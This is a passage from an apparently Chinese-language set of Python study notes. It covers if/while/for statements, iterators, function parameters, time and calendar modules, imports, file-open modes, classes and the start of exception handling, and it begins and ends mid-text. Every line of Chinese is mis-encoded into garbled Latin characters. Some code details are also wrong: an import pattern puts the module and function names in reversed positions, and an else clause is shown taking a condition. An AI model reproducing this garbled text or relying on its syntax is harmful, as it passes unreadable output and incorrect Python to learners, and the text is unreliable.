<p>PSï¼šæ³¨é‡Œçš„è¯è¯­åœ¨è„šæœ¬å¼ç¼–ç¨‹ç¯å¢ƒç»å¯¹æˆç«‹ï¼Œè€Œåœ¨äº¤äº’å¼ç¯å¢ƒä¸­ï¼Œç¼–è¯‘å™¨ä¼šæœ‰å°æ•´æ•°æ± æ¦‚å¿µï¼Œä¼šæŠŠï¼ˆ-5ï¼Œ256ï¼‰çš„æ•°é¢„å…ˆåˆ›å¥½ï¼Œè€Œå½“å˜é‡è¶…è¿‡è¿™ä¸ªèŒƒå›´ï¼Œå°±ä¼šæŒ‡å‘ä¸åŒçš„å¯¹è±¡ï¼Œåœ°å€ä¹Ÿä¼šå˜åŒ–</p>
<h3 id="å››ã€è¯­å¥ç»“æ„"><a href="#å››ã€è¯­å¥ç»“æ„" class="headerlink" title="å››ã€è¯­å¥ç»“æ„"></a>å››ã€è¯­å¥ç»“æ„</h3><p>1ã€ifæ¡ä»¶è¯­å¥ï¼špythonä¸­ä½¿ç”¨elifä»£æ›¿äº†cè¯­è¨€ä¸­çš„else if </p>
<p>æ‰€ä»¥æ ¼å¼ä¸º <strong>if è¯­å¥1:</strong></p>
<p>â€‹                            <strong>æ‰§è¡Œè¯­å¥1</strong></p>
<p>â€‹                    <strong>elif è¯­å¥2:</strong></p>
<p>â€‹                            <strong>æ‰§è¡Œè¯­å¥2</strong></p>
<p>â€‹                    <strong>else è¯­å¥3:</strong></p>
<p>â€‹                            <strong>æ‰§è¡Œè¯­å¥3</strong> </p>
<p>å…¶ä¸­elifå¯ä»¥æœ‰æ— æ•°è¡Œ ï¼›å¹¶ä¸”åé¢çš„è¯­å¥çš„åœ†æ‹¬å·å¯åŠ å¯ä¸åŠ ï¼Œå½“ç„¶cè¯­è¨€ä¸­æ˜¯è¦åŠ çš„ï¼ˆpythonæ²¡æœ‰switchè¯­å¥ï¼‰</p>
<p>åˆ¤æ–­æ¡ä»¶ä¸ºå‡ï¼š0ï¼›Falseï¼›â€™ â€˜ï¼›None  æ¡ä»¶ä¸ºçœŸï¼šé0ï¼›Trueï¼›â€Noneâ€ ;å­—ç¬¦ä¸²ä¸ä¸ºç©º</p>
<p>2ã€whileå¾ªç¯è¯­å¥ï¼ˆä¸å­˜åœ¨do whileè¯­å¥ï¼‰</p>
<p>ï¼ˆ1ï¼‰while è¯­å¥æ ¼å¼ï¼š<strong>while åˆ¤æ–­æ¡ä»¶:</strong></p>
<p>â€‹                                                <strong>æ‰§è¡Œè¯­å¥</strong></p>
<p>ï¼ˆ2ï¼‰pythonä¸­whileè¯­å¥ä¸­å¯ä»¥ä½¿ç”¨elseè¯­å¥è¿›è¡Œæ‰§è¡Œwhileä¸­åˆ¤æ–­é”™è¯¯è€Œè·³è½¬åˆ°elseè¯­å¥ä¸­</p>
<p>ï¼ˆ3ï¼‰breakç”¨äºè·³å‡ºå½“å‰å¾ªç¯ï¼Œå¹¶ä¸”ä¸whileåŒç­‰ç¼©è¿›çš„elseä¹Ÿä¸æ‰§è¡Œ</p>
<p>ï¼ˆ4ï¼‰continueç”¨æ³•ä¸cä¸­ä¸€è‡´</p>
<p>3ã€forå¾ªç¯è¯­å¥</p>
<p>ï¼ˆ1ï¼‰æ ¼å¼ï¼š<strong>for å˜é‡/å…ƒç´ /å­—ç¬¦ä¸²ç­‰ç­‰ in åˆ—è¡¨/å…ƒç»„/é›†åˆ/å­—ç¬¦ä¸²/å­—å…¸/:</strong></p>
<p>â€‹                                <strong>æ‰§è¡Œè¯­å¥</strong></p>
<p>â€‹                      <strong>else:</strong></p>
<p>â€‹                                <strong>æ‰§è¡Œè¯­å¥</strong></p>
<p>ï¼ˆ2ï¼‰for åé¢å¦‚æœæ˜¯ä¸€ä¸ªéšæ„çš„å˜é‡åï¼Œåˆ™ä»£è¡¨è¯¥å˜é‡å¯ä»¥æ˜¯inåé¢çš„åºåˆ—ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œä»å·¦å¾€å³å¼€å§‹æŠŠå…ƒç´ èµ‹å€¼ç»™è¯¥å˜é‡</p>
<p>ï¼ˆ3ï¼‰å¦‚æœå˜æˆä¾‹å¦‚for x in range(len(åºåˆ—å))ï¼Œé‚£ä¹ˆèµ‹å€¼ç»™x çš„æ˜¯0ï¼Œ1ï¼Œ2è¿™æ ·çš„æ•°å­—ã€‚å¦‚æœæŒ‰ç…§ï¼ˆ1ï¼‰çš„æ ¼å¼å†™å¾ªç¯è¯­å¥ï¼Œé‚£ä¹ˆlen(x) è¾“å‡ºçš„æ‰æ˜¯åºå·</p>
<p>ï¼ˆ4ï¼‰breakä¸continueçš„ç”¨æ³•ä¸åœ¨whileä¸­ä¸€è‡´</p>
<p>ï¼ˆ5ï¼‰forè¯­å¥ç»å¸¸ä¸range()æ­é…ä½¿ç”¨ï¼Œæ„æˆé¡ºåºçš„å¾ªç¯æ¡ä»¶</p>
<h3 id="äº”ã€è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨"><a href="#äº”ã€è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨" class="headerlink" title="äº”ã€è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨"></a>äº”ã€è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨</h3><p>1ã€è¿­ä»£ï¼šè®¿é—®é›†åˆå…ƒç´ çš„ä¸€ç§æ–¹å¼</p>
<p>2ã€è¿­ä»£å™¨</p>
<p>ï¼ˆ1ï¼‰å¯ä»¥è®°ä½éå†ä½ç½®çš„å¯¹è±¡</p>
<p>ï¼ˆ2ï¼‰æ˜¯ä»é›†åˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡å¼€å§‹è®¿é—®ï¼Œç›´åˆ°æ‰€æœ‰å…ƒç´ è¢«è®¿é—®å®Œä¸ºæ­¢ã€‚è¿­ä»£å™¨åªèƒ½å‘å‰ä¸èƒ½é€€å</p>
<p>ï¼ˆ3ï¼‰åˆ›å»ºæ–¹æ³•ï¼š<strong>iter(åˆ›å»ºå¯¹è±¡)</strong>    åˆ›å»ºå¯¹è±¡ï¼šå­—ç¬¦ä¸²ï¼Œåˆ—è¡¨ï¼Œå…ƒç»„</p>
<h3 id="å…­ã€å‡½æ•°"><a href="#å…­ã€å‡½æ•°" class="headerlink" title="å…­ã€å‡½æ•°"></a>å…­ã€å‡½æ•°</h3><p>1ã€è‡ªå®šä¹‰å‡½æ•°</p>
<p>ï¼ˆ1ï¼‰æ ¼å¼ï¼š<strong>def å‡½æ•°å (å‚æ•°åˆ—è¡¨):</strong></p>
<p>â€‹                             <strong>å‡½æ•°ä½“</strong></p>
<p>ï¼ˆ2ï¼‰ä»¥<strong>return è¡¨è¾¾å¼</strong> ä½œä¸ºç»“æŸï¼Œè¿”å›ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ï¼›ä¸è¦è¿”å›å€¼æ—¶å†™æˆ<strong>return</strong> åˆ™è¿”å›Noneï¼Œæˆ–è€…ç›´æ¥ä¸è¦returnï¼›pythonä¸­returnå¯ä»¥è¿”å›å¤šä¸ªå€¼ï¼Œä»¥å…ƒç»„çš„å½¢å¼è¿”å›</p>
<p>2ã€è°ƒç”¨å‡½æ•°ï¼šé€šè¿‡ç›´æ¥è¾“å…¥<strong>å‡½æ•°å()</strong> æœ‰å‚æ•°åˆ™åœ¨é‡Œé¢è¾“å…¥å‚æ•°ï¼Œæ— å‚çš„åˆ™ä¸ºç©ºæ‹¬å·</p>
<p>3ã€å¯¹è±¡å¯å˜ä¸ä¸å¯å˜ï¼šåœ¨å‡½æ•°ä¸­è°ƒç”¨çš„å‚æ•°ï¼Œå¦‚æœæ˜¯ä¸å¯å˜å¯¹è±¡ï¼šå­—ç¬¦ä¸²ã€æ•°å­—ã€å…ƒç»„å¯¹è±¡ï¼Œé‚£ä¹ˆä¸ä¼šå¯¹åŸæœ¬çš„å‚æ•°é€ æˆå½±å“ï¼›è€Œå¦‚æœæ˜¯å¯å˜å¯¹è±¡ï¼šå­—å…¸ã€åˆ—è¡¨ï¼Œé‚£ä¹ˆåœ¨å‡½æ•°å†…éƒ¨å¯¹å…¶çš„ä¿®æ”¹æ˜¯çœŸæ­£çš„ä¼šå½±å“æœ¬æ¥çš„å‚æ•°</p>
<p>4ã€å‚æ•°</p>
<p>ï¼ˆ1ï¼‰å¿…é¡»å‚æ•°ï¼šæŒ‰ç…§å®šä¹‰å‡½æ•°çš„å½¢å‚ä¸ªæ•°ä¸€ä¸€å¯¹åº”è¾“å…¥å®å‚è¿›è¡Œè¿ç®—ï¼Œå¦åˆ™ä¼šå‡ºé”™</p>
<p>ï¼ˆ2ï¼‰å…³é”®å­—å‚æ•°ï¼šè°ƒç”¨æ—¶æŠŠå‚æ•°åä»¥åŠå¯¹åº”çš„å€¼å…¨éƒ½æ”¾å…¥åˆ°åœ†æ‹¬å·é‡Œé¢ï¼Œé‚£ä¹ˆæ­¤æ—¶ï¼Œå¯ä»¥ä¸æŒ‰é¡ºåºè¾“å…¥</p>
<p>ï¼ˆ3ï¼‰é»˜è®¤å‚æ•°ï¼šåœ¨è‡ªå®šä¹‰å‡½æ•°ä¸­ï¼Œå·²ç»ä¸ºæŸäº›å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œé‚£ä¹ˆè¿™äº›å˜é‡åœ¨è°ƒç”¨æ—¶ï¼Œå¦‚æœä¸è¾“å…¥åˆ™ä¼šä½¿ç”¨å·²ç»èµ‹å¥½çš„å€¼ï¼Œå¦‚æœæœ‰åˆ™ä»¥è°ƒç”¨æ—¶è¾“å…¥çš„å€¼ä¸ºå‡†</p>
<p>ï¼ˆ4ï¼‰ä¸å®šé•¿å‚æ•°ï¼šåœ¨å‚æ•°å‰é¢åŠ ä¸Š*æ„æˆä¸å®šé•¿å‚æ•°ï¼Œè€Œä¸å®šé•¿å‚æ•°ä¼šä»¥å…ƒç»„å½¢å¼å¯¼å…¥ï¼Œå­˜æ”¾æ‰€æœ‰æœªå‘½åçš„å˜é‡å‚æ•°ã€‚è¿˜æœ‰ä¸€ç§å¸¦æœ‰**çš„å‚æ•°ï¼Œå°†ä¼šä»¥å­—å…¸å½¢å¼å¯¼å…¥ã€‚æ³¨ï¼šåœ¨ä¸å®šé•¿å‚æ•°åé¢çš„å‚æ•°å¿…é¡»å…³é”®å­—å‚æ•°è¾“å…¥æ–¹å¼</p>
<p>ï¼ˆ5ï¼‰åŒ¿åå‡½æ•°ï¼š<strong>å‡½æ•°å=lambda arg1,arg2â€¦â€¦ ï¼šè¡¨è¾¾å¼</strong> </p>
<p>åªæœ‰ä¸€ä¸ªè¯­å¥ï¼Œä¸èƒ½è®¿é—®å‚æ•°åˆ—è¡¨ä¹‹å¤–çš„æˆ–å…¨å±€å‘½åç©ºé—´é‡Œé¢çš„å‚æ•°</p>
<h3 id="ä¸ƒã€æ—¥æœŸä¸æ—¶é—´"><a href="#ä¸ƒã€æ—¥æœŸä¸æ—¶é—´" class="headerlink" title="ä¸ƒã€æ—¥æœŸä¸æ—¶é—´"></a>ä¸ƒã€æ—¥æœŸä¸æ—¶é—´</h3><p>1ã€pythonä¸­æä¾›timeå’Œcalendaræ¨¡å—ç”¨äºæ ¼å¼åŒ–æ—¥æœŸå’Œæ—¶é—´</p>
<p>2ã€æ—¶é—´é—´éš”æ˜¯ä»¥ç§’ä¸ºå•ä½çš„æµ®ç‚¹æ•°</p>
<p>3ã€æ¯ä¸ªæ—¶é—´æˆ³éƒ½æ˜¯ä»1970å¹´1æœˆ1æ—¥åˆå¤œç»è¿‡å¤šå°‘æ—¶é—´è¡¨ç¤ºï¼ˆæ—¶é—´æˆ³æœ€é€‚äºåšæ—¥æœŸè¿ç®—ï¼Œä½†ç›®å‰åªæ”¯æŒåˆ°2038å¹´ï¼‰</p>
<p>4ã€import time ï¼›localtime = time.asctime( time.localtime(time.time()) ) å¯è·å¾—æ ¼å¼åŒ–æ—¥æœŸ</p>
<p>5ã€è·å–æŸæœˆæ—¥å†ï¼šimport calendar ï¼› calendar.month(2016,1)</p>
<h3 id="å…«ã€æ¨¡å—"><a href="#å…«ã€æ¨¡å—" class="headerlink" title="å…«ã€æ¨¡å—"></a>å…«ã€æ¨¡å—</h3><p>1ã€<strong>import æ¨¡å—å</strong>ï¼šå¼•å…¥æ¨¡å—ï¼Œç±»ä¼¼ä¸€ä¸ªå£°æ˜è¯­å¥ï¼ˆæ¨¡å—ï¼Œåœ¨æˆ‘çœ‹æ¥å°±åƒcçš„å¤´æ–‡ä»¶ï¼‰</p>
<p>2ã€<strong>æ¨¡å—å.å‡½æ•°å</strong> ï¼šè°ƒç”¨æ¨¡å—é‡Œé¢çš„å‡½æ•°</p>
<p>3ã€å¦‚æœåªæƒ³å•ç‹¬çš„è°ƒç”¨å‡ ä¸ªå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨<strong>from å‡½æ•°å import æ¨¡å—å</strong> </p>
<p>4ã€**from æ¨¡å—å import * **  ï¼šæŠŠä¸€ä¸ªæ¨¡å—ä¸­çš„æ‰€æœ‰å†…å®¹å¯¼å…¥åˆ°å½“å‰çš„å‘½åç©ºé—´ï¼Œé‚£ä¹ˆæ­¤æ—¶è°ƒç”¨å‡½æ•°ï¼Œç›´æ¥è¾“å…¥å‡½æ•°åå³å¯ï¼Œæ— éœ€å†åƒ2é‚£æ ·å»è°ƒç”¨</p>
<p>5ã€å‘½åç©ºé—´æ˜¯ä¸€ä¸ªåŒ…å«äº†å˜é‡åç§°ä»¬ï¼ˆé”®ï¼‰ å’Œä»–ä»¬å„è‡ªå¯¹åº”çš„å¯¹è±¡ä»¬ï¼ˆå€¼ï¼‰çš„å­—å…¸</p>
<p>6ã€dir(æ¨¡å—å)å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæ¨¡å—é‡Œé¢å®šä¹‰çš„å‡½æ•°å</p>
<h3 id="ä¹ã€æ–‡ä»¶"><a href="#ä¹ã€æ–‡ä»¶" class="headerlink" title="ä¹ã€æ–‡ä»¶"></a>ä¹ã€æ–‡ä»¶</h3><table>
<thead>
<tr>
<th>æ¨¡å¼</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>t</td>
<td>æ–‡æœ¬æ¨¡å¼ (é»˜è®¤)ã€‚</td>
</tr>
<tr>
<td>x</td>
<td>å†™æ¨¡å¼ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™ä¼šæŠ¥é”™ã€‚</td>
</tr>
<tr>
<td>b</td>
<td>äºŒè¿›åˆ¶æ¨¡å¼ã€‚</td>
</tr>
<tr>
<td>+</td>
<td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ›´æ–°(å¯è¯»å¯å†™)ã€‚</td>
</tr>
<tr>
<td>U</td>
<td>é€šç”¨æ¢è¡Œæ¨¡å¼ï¼ˆä¸æ¨èï¼‰ã€‚</td>
</tr>
<tr>
<td>r</td>
<td>ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚</td>
</tr>
<tr>
<td>rb</td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td>
</tr>
<tr>
<td>r+</td>
<td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td>
</tr>
<tr>
<td>rb+</td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td>
</tr>
<tr>
<td>w</td>
<td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>wb</td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td>
</tr>
<tr>
<td>w+</td>
<td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>wb+</td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td>
</tr>
<tr>
<td>a</td>
<td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td>
</tr>
<tr>
<td>ab</td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td>
</tr>
<tr>
<td>a+</td>
<td>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td>
</tr>
<tr>
<td>ab+</td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td>
</tr>
</tbody></table>
<p>file object=open(æ–‡ä»¶å,æ¨¡å¼,bufferingå€¼)  </p>
<p>bufferingå€¼ä¸º0ï¼Œä¸ä¼šæœ‰å¯„å­˜ï¼›ä¸º1ï¼Œè®¿é—®æ–‡ä»¶æ—¶ä¼šå¯„å­˜è¡Œï¼›å¤§äº1çš„æ•´æ•°ï¼Œè¡¨ç¤ºè¿™æ˜¯å¯„å­˜åŒºçš„ç¼“å†²å¤§å°ï¼›å–è´Ÿå€¼ï¼Œå¯„å­˜åŒºçš„ç¼“å†²å¤§å°ä¸ºç³»ç»Ÿé»˜è®¤ï¼ˆç¬¬ä¸‰ä¸ªå¯å†™ï¼Œå¯ä¸å†™ï¼‰</p>
<p>æ‰“å¼€æ–‡ä»¶åï¼Œä¼šæœ‰ä¸€ä¸ªfileå¯¹è±¡</p>
<table>
<thead>
<tr>
<th>å±æ€§</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>file.closed</td>
<td>è¿”å›trueå¦‚æœæ–‡ä»¶å·²è¢«å…³é—­ï¼Œå¦åˆ™è¿”å›falseã€‚</td>
</tr>
<tr>
<td>file.mode</td>
<td>è¿”å›è¢«æ‰“å¼€æ–‡ä»¶çš„è®¿é—®æ¨¡å¼ã€‚</td>
</tr>
<tr>
<td>file.name</td>
<td>è¿”å›æ–‡ä»¶çš„åç§°ã€‚</td>
</tr>
<tr>
<td>file.softspace</td>
<td>å¦‚æœç”¨printè¾“å‡ºåï¼Œå¿…é¡»è·Ÿä¸€ä¸ªç©ºæ ¼ç¬¦ï¼Œåˆ™è¿”å›falseã€‚å¦åˆ™è¿”å›trueã€‚</td>
</tr>
</tbody></table>
<h3 id="åã€é¢å‘å¯¹è±¡"><a href="#åã€é¢å‘å¯¹è±¡" class="headerlink" title="åã€é¢å‘å¯¹è±¡"></a>åã€é¢å‘å¯¹è±¡</h3><p>1ã€ç±»å®šä¹‰ï¼š<strong>class ç±»å:</strong> </p>
<p>â€‹                                å±æ€§ï¼Œæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰</p>
<p>ï¼ˆ1ï¼‰ç±»çœ‹èµ·æ¥å¾ˆåƒcçš„ç»“æ„ä½“ï¼Œå…¶ä¸­çš„å±æ€§ï¼Œåƒç»“æ„ä½“ä¸­çš„æˆå‘˜ï¼Œæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰æ˜¯å¤šå‡ºçš„ä¸€ä¸ªç‰¹è‰²çš„åœ°æ–¹</p>
<p>ï¼ˆ2ï¼‰å¼•ç”¨ç±»ä¸­çš„å±æ€§å’Œå‡½æ•°ï¼š<strong>å®ä¾‹åŒ–ç±»å¯¹è±¡.å±æ€§ï¼ˆæˆ–å‡½æ•°ï¼‰</strong></p>
<p>ï¼ˆ3ï¼‰ç±»çš„æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰åœ¨å‡½æ•°ååçš„åœ†æ‹¬å·å†…éœ€è¦å¤šä¸€ä¸ªselfä»£è¡¨ç±»çš„å®ä¾‹</p>
<p>2ã€ç±»çš„å®ä¾‹åŒ–ï¼š<strong>å˜é‡å=ç±»å()</strong> </p>
<p>3ã€ç±»ä¸­ç‰¹æ®Šçš„å‡½æ•°æ„é€ æ–¹æ³• **def __ init __(self,å…¶ä»–å‚æ•°): ** è¯¥å‡½æ•°å®šä¹‰åï¼Œåœ¨å¯¹ç±»å®ä¾‹åŒ–åä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ‰€ä»¥ï¼Œæ­¤æ—¶è¦åœ¨å®ä¾‹åŒ–ç±»ååçš„åœ†æ‹¬å·å†…å¡«å…¥å®å‚ã€‚</p>
<p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œè°ƒç”¨å˜é‡éœ€è¦å†™æˆ<strong>self.å½¢å‚å(æˆ–å±æ€§)</strong></p>
<p>4ã€ç±»çš„ç§æœ‰å±æ€§ï¼šåœ¨å®šä¹‰å±æ€§æ—¶åœ¨å‰é¢åŠ ä¸¤ä¸ªä¸‹åˆ’çº¿</p>
<p>5ã€ç±»çš„ç§æœ‰æ–¹æ³•ï¼šå®šä¹‰æ–¹æ³•å‡½æ•°æ—¶ï¼Œåœ¨å‰é¢åŠ ä¸¤ä¸ªä¸‹åˆ’çº¿</p>
<p>6ã€ç±»çš„ç»§æ‰¿ï¼š<strong>class å­ç±»(çˆ¶ç±»)</strong></p>
<p>ï¼ˆ1ï¼‰ç»§æ‰¿åï¼Œå¯ä»¥è°ƒç”¨çˆ¶ç±»ä¸­çš„æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œæ”¹å˜</p>
<h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    å¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„ä»£ç å—<br><span class="hljs-keyword">except</span> [ (Error1, Error2, ... ) [<span class="hljs-keyword">as</span> e] ]:<br>    å¤„ç†å¼‚å¸¸çš„ä»£ç å—<span class="hljs-number">1</span><br><span class="hljs-keyword">except</span> [ (Error3, Error4, ... ) [<span class="hljs-keyword">as</span> e] ]:<br>    å¤„ç†å¼‚å¸¸çš„ä»£ç å—<span class="hljs-number">2</span><br><span class="hljs-keyword">except</span>  [Exception]:<br>    å¤„ç†å…¶å®ƒå¼‚å¸¸<br></code></pre></td></tr></table></figure>

<p>è¯¥æ ¼å¼ä¸­ï¼Œ[] æ‹¬èµ·æ¥çš„éƒ¨åˆ†å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥çœç•¥ã€‚å…¶ä¸­å„éƒ¨åˆ†çš„å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li>(Error1, Error2,â€¦) ã€(Error3, Error4,â€¦)ï¼šå…¶ä¸­ï¼ŒError1ã€Error2ã€Error3 å’Œ Error4 éƒ½æ˜¯å…·ä½“çš„å¼‚å¸¸ç±»å‹ã€‚æ˜¾ç„¶ï¼Œä¸€ä¸ª except å—å¯ä»¥åŒæ—¶å¤„ç†å¤šç§å¼‚å¸¸ã€‚</li>
<li>[as e]ï¼šä½œä¸ºå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºç»™å¼‚å¸¸ç±»å‹èµ·ä¸€ä¸ªåˆ«å eï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯æ–¹ä¾¿åœ¨ except å—ä¸­è°ƒç”¨å¼‚å¸¸ç±»å‹ï¼ˆåç»­ä¼šç”¨åˆ°ï¼‰ã€‚</li>
<li>[Exception]ï¼šä½œä¸ºå¯é€‰å‚æ•°ï¼Œå¯ä»¥ä»£æŒ‡ç¨‹åºå¯èƒ½å‘ç”Ÿçš„æ‰€æœ‰å¼‚å¸¸æƒ…å†µï¼Œå…¶é€šå¸¸ç”¨åœ¨æœ€åä¸€ä¸ª except å—ã€‚</li>
</ul>
<p>try except è¯­å¥çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>é¦–å…ˆæ‰§è¡Œ try ä¸­çš„ä»£ç å—ï¼Œå¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¼‚å¸¸ç±»å‹ï¼Œå¹¶å°†è¯¥å¼‚å¸¸æäº¤ç»™ Python è§£é‡Šå™¨ï¼Œæ­¤è¿‡ç¨‹ç§°ä¸ºæ•è·å¼‚å¸¸ã€‚</li>
